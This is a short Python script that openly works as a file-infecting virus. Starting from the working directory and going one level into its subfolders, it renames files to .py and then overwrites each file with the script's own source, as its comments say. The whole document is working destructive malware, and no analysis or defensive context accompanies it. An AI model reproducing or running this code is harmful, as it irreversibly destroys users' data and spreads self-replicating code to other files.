import os
import sys

class GeneralData:
    files = []
    directories = []
    mainPathFile = os.getcwd()

# Function for convert files to Python files
def ConvertFiles(dir):
    for i in os.listdir(dir):
        if '.' in i:
            try:
                os.rename(dir + '/' + '{}'.format(i) , dir + "/" + '{}.py'.format(i.split('.')[0]))
            except:
                continue
        else:
            GeneralData.directories.append(i)
    
    GeneralData.files.clear()
    # Get modified files
    for i in os.listdir(dir):
        GeneralData.files.append(i)

# Find files in current directory and convert files to Python files
# Read content of files and if they are not malicious, inject script into them
# 
def Run(dir):
    ConvertFiles(dir)
    ReadFileContent(GeneralData.files , os.getcwd())

    for i in GeneralData.directories:
        try:
            ConvertFiles(GeneralData.mainPathFile + '/' + i)
            ReadFileContent(GeneralData.files , GeneralData.mainPathFile + '/' + i)
        except:
            continue

# Checking for is it changed already or not
def ReadFileContent(files , dir):
    os.chdir(dir)
    for file in files:
        try:
            with open(file , mode= 'r') as f:
                if f.read() == InfectedFileContent():
                    continue
                else:
                    ContentChanger(file)        
        except:
            continue

# Copy content of this script
def InfectedFileContent():
    with open(sys.argv[0] , mode='r') as f:
        maliciousContent = f.read()
    return maliciousContent

# Write malicious script to files
def ContentChanger(file):
    with open(file , mode= 'w') as f:
        f.write(InfectedFileContent())

Run(GeneralData.mainPathFile)
